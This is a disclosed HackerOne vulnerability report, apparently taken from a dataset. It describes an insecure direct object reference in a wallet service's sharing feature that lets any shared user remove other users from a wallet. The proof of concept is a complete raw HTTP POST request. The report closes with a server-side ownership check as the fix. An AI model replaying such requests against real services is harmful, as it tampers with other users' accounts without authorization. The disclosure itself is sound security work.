---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '85720'
original_report_id: '85720'
title: IDOR on remoing Share
weakness: Violation of Secure Design Principles
team_handle: enter
created_at: '2015-08-30T18:46:30.968Z'
disclosed_at: '2015-11-27T06:26:11.492Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- violation-of-secure-design-principles
---

# IDOR on remoing Share

## Metadata

- HackerOne Report ID: 85720
- Weakness: Violation of Secure Design Principles
- Program: enter
- Disclosed At: 2015-11-27T06:26:11.492Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Issue**
In case of Operator Wallets, only `Owner` has the permission to delete share with any user. But It is possible for any user to delete share for any other user.

**POC**
1. Suppose a wallet `BITCOINS` is created by user A and shared with user B and C.
2. User B can send the following request and delete User C as there are no server side verifications

    POST /dashboard/account/<accountID>/sharing/delete HTTP/1.1
    Host: wallet.romit.io
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Referer: https://wallet.romit.io/dashboard
    Content-Length: 90
    Cookie: <redatcted>
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache

    bankUserId=<User C's ID>&_csrf=3b919c4a-776f-4144-84b7-88d315f57815

**Solution**
Verify that the user who is deleting the user is actually an owner for that wallet.

Thanks
Sparsh

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
